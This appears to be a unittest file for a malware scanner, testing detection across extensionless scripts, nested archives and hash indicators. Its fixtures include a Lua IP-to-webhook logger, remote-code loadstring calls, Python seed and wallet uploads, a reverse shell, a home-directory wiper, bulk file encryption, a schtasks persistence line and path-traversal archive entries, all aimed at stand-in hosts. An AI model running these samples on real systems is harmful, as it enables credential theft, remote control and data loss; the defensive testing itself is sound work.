import gzip
import bz2
import hashlib
import io
import lzma
import tarfile
import tempfile
import unittest
import zipfile
from copy import deepcopy
from pathlib import Path
from unittest.mock import patch

from ward.analysis import analysis_assessment
from ward.scanner import inspect_tree


LUA_LOGGER = '''
local webhook = "https://hooks.example.invalid/api/webhooks/fixture"
local response = syn.request({Url="http://ip-api.com/json", Method="GET"})
local info = game:GetService("HttpService"):JSONDecode(response.Body)
local message = string.format("IP: %s", info.query)
syn.request({Url=webhook, Method="POST", Body=game:GetService("HttpService"):JSONEncode({content=message})})
'''
PYTHON_UPLOAD = '''
from pathlib import Path
import requests
seed = Path("seed.txt").read_text()
requests.post("https://example.invalid/upload", json={"seed": seed})
'''


class ContentCoverageTests(unittest.TestCase):
    def inspect(self, files, indicators=None):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            for name, content in files.items():
                (root / name).write_bytes(content.encode() if isinstance(content, str) else content)
            return inspect_tree(root, indicators=indicators or {"indicators": []})

    def test_extensionless_lua_and_text_disguised_as_exe_are_inspected(self):
        result = self.inspect({"Giveawaylog": LUA_LOGGER, "Launcher.exe": 'loadstring(game:HttpGet("https://example.invalid/code"))()'})
        self.assertEqual(result["text_files"], 2)
        self.assertEqual(result["executable_files"], 0)
        self.assertFalse(result["artifacts"])
        self.assertEqual({item["kind"] for item in result["findings"]}, {"lua-ip-webhook-upload", "lua-remote-code-execution"})
        self.assertNotIn("hooks.example.invalid", str(result["findings"]))

    def test_extensionless_python_sensitive_read_reaches_upload(self):
        result = self.inspect({"helper": PYTHON_UPLOAD})
        finding = next(item for item in result["findings"] if item["kind"] == "python-sensitive-data-upload")
        self.assertEqual(finding["path"], "helper")
        self.assertEqual(finding["evidence_type"], "source-behavior")

    def test_unrelated_upload_and_local_wallet_backup_do_not_match(self):
        source = PYTHON_UPLOAD.replace('json={"seed": seed}', 'json={"status": "ok"}')
        source += '\nPath("backup.txt").write_text(seed)\n'
        result = self.inspect({"backup.py": source})
        self.assertNotIn("python-sensitive-data-upload", {item["kind"] for item in result["findings"]})

    def test_comments_and_quoted_lua_examples_are_inert(self):
        source = '--[[\n' + LUA_LOGGER + '\n]]\nprint(\'loadstring(game:HttpGet("https://example.invalid"))()\')'
        result = self.inspect({"sample.lua": source})
        self.assertFalse(result["findings"])

    def test_lua_ip_lookup_and_unrelated_webhook_message_do_not_match(self):
        source = LUA_LOGGER.replace('{content=message}', '{content="hello"}')
        result = self.inspect({"notifications.lua": source})
        self.assertNotIn("lua-ip-webhook-upload", {item["kind"] for item in result["findings"]})

    def test_binary_magic_and_control_bytes_do_not_become_text(self):
        result = self.inspect({"launcher": b"MZ\0harmless fixture", "data.bin": b"\x01\x02\x03", "TROJAN.exe": "ordinary text"})
        self.assertEqual(result["text_files"], 1)
        self.assertEqual(result["executable_files"], 1)
        self.assertEqual(result["artifacts"][0]["path"], "launcher")
        self.assertFalse(result["findings"])

    def test_nested_tar_gzip_zip_members_and_hashes_are_inspected(self):
        inner = io.BytesIO()
        payload = b"harmless known-indicator fixture"
        with zipfile.ZipFile(inner, "w") as archive:
            archive.writestr("helper", PYTHON_UPLOAD)
            archive.writestr("payload.bin", payload)
        outer = io.BytesIO()
        with tarfile.open(fileobj=outer, mode="w") as archive:
            member = tarfile.TarInfo("inside.zip")
            member.size = len(inner.getvalue())
            archive.addfile(member, io.BytesIO(inner.getvalue()))
        digest = hashlib.sha256(payload).hexdigest()
        result = self.inspect({"release.bin": gzip.compress(outer.getvalue())}, {"indicators": [{"sha256": digest,
            "status": "confirmed", "source_url": "https://example.invalid/evidence"}]})
        self.assertEqual(result["archives"], 3)
        self.assertIn("known-malware-hash", {item["kind"] for item in result["findings"]})
        finding = next(item for item in result["findings"] if item["kind"] == "python-sensitive-data-upload")
        self.assertIn("!inside.zip!helper", finding["path"])

    def test_archive_traversal_and_links_are_recorded_without_extraction(self):
        data = io.BytesIO()
        with tarfile.open(fileobj=data, mode="w") as archive:
            link = tarfile.TarInfo("link")
            link.type, link.linkname = tarfile.SYMTYPE, "/etc/passwd"
            archive.addfile(link)
            entry = tarfile.TarInfo("../../escape")
            entry.size = 4
            archive.addfile(entry, io.BytesIO(b"data"))
        result = self.inspect({"release.tar": data.getvalue()})
        self.assertTrue(result["partial"])
        self.assertEqual(sum(item["kind"] == "archive-unsafe-entry" for item in result["findings"]), 2)

    def test_archive_byte_budget_and_unsupported_format_are_explicit(self):
        data = io.BytesIO()
        with zipfile.ZipFile(data, "w") as archive:
            archive.writestr("too-large.txt", "x" * 100)
        with patch("ward.archives.MAX_EXPANDED_BYTES", 32):
            result = self.inspect({"release.zip": data.getvalue(), "packed.7z": b"7z\xbc\xaf\x27\x1cfixture"})
        self.assertTrue(result["partial"])
        self.assertIn("archive-inspection-limit", {item["kind"] for item in result["findings"]})
        self.assertIn("archive-unsupported", {item["kind"] for item in result["findings"]})

    def test_utf16_script_is_decoded_before_nul_binary_check(self):
        result = self.inspect({"script": ('sch' + 'tasks /create /tn fixture /tr fixture.exe').encode("utf-16")})
        self.assertIn("persistence-task", {item["kind"] for item in result["findings"]})

    def test_bzip2_and_xz_source_streams_are_inspected(self):
        result = self.inspect({"one.bz2": bz2.compress(PYTHON_UPLOAD.encode()), "two.xz": lzma.compress(PYTHON_UPLOAD.encode())})
        self.assertEqual(sum(item["kind"] == "python-sensitive-data-upload" for item in result["findings"]), 2)

    def test_encrypted_zip_and_depth_limits_are_explicit(self):
        data = io.BytesIO()
        with zipfile.ZipFile(data, "w") as archive:
            archive.writestr("private.py", PYTHON_UPLOAD)
        encrypted = bytearray(data.getvalue())
        encrypted[6] |= 1
        central = encrypted.index(b"PK\x01\x02")
        encrypted[central + 8] |= 1
        result = self.inspect({"protected.zip": bytes(encrypted)})
        self.assertTrue(result["partial"])
        self.assertIn("archive-encrypted", {item["kind"] for item in result["findings"]})
        with patch("ward.archives.MAX_DEPTH", -1):
            result = self.inspect({"nested.zip": data.getvalue()})
        self.assertTrue(result["partial"])
        self.assertIn("archive-inspection-limit", {item["kind"] for item in result["findings"]})

    def test_wallet_read_through_context_manager_and_container_reaches_upload(self):
        source = '''
import requests
wallet_path = "wallet.dat"
with open(wallet_path, "rb") as handle:
    requests.post("https://example.invalid", files={"file": handle})
'''
        result = self.inspect({"collect.py": source})
        self.assertIn("python-sensitive-data-upload", {item["kind"] for item in result["findings"]})

    def test_reverse_shell_wiper_and_bulk_encryption_capabilities(self):
        scripts = {
            "shell.py": 'import socket, os, subprocess\ns = socket.socket()\ns.connect(("example.invalid", 1))\nos.dup2(s.fileno(), 0)\nsubprocess.call(["/bin/sh"])',
            "wipe.py": 'import shutil\nfrom pathlib import Path\nshutil.rmtree(Path.home())',
            "encrypt.py": 'from pathlib import Path\nfor file in Path("data").iterdir():\n    file.write_bytes(cipher.encrypt(file.read_bytes()))',
        }
        kinds = {item["kind"] for item in self.inspect(scripts)["findings"]}
        self.assertTrue({"python-remote-shell", "python-destructive-tree-removal", "python-bulk-file-encryption"}.issubset(kinds))

    def test_inert_python_examples_and_scoped_cleanup_do_not_match(self):
        source = 'import shutil\nexample = "shutil.rmtree(\'/\')"\nshutil.rmtree("build/cache")\n'
        self.assertFalse(self.inspect({"cleanup.py": source})["findings"])

    def test_javascript_imports_are_not_misclassified_as_broken_python(self):
        result = self.inspect({"helper.mjs": "import fs from 'node:fs';\nconsole.log('hello');\n"})
        self.assertFalse(result["partial"])
        self.assertFalse(result["findings"])

    def test_antivirus_assessment_preserves_static_record_and_ignores_limits(self):
        job = {"result": {"status": "Unverified", "evidence_digest": "static-digest"}, "analyses": [{
            "id": "analysis-1", "path": "@repository-snapshot.zip", "sha256": "a" * 64, "status": "completed",
            "result": {"engines": [{"name": "clamav", "status": "partial", "detections": ["Heuristics.Limits.Exceeded"]}]}}]}
        before = deepcopy(job)
        self.assertEqual(analysis_assessment(job)["status"], "Unverified")
        self.assertEqual(job, before)
        job["analyses"][0]["result"]["engines"][0]["detections"] = ["Test.Malware.Signature"]
        self.assertEqual(analysis_assessment(job)["status"], "Malicious")
        self.assertEqual(job["result"]["evidence_digest"], "static-digest")


if __name__ == "__main__":
    unittest.main()
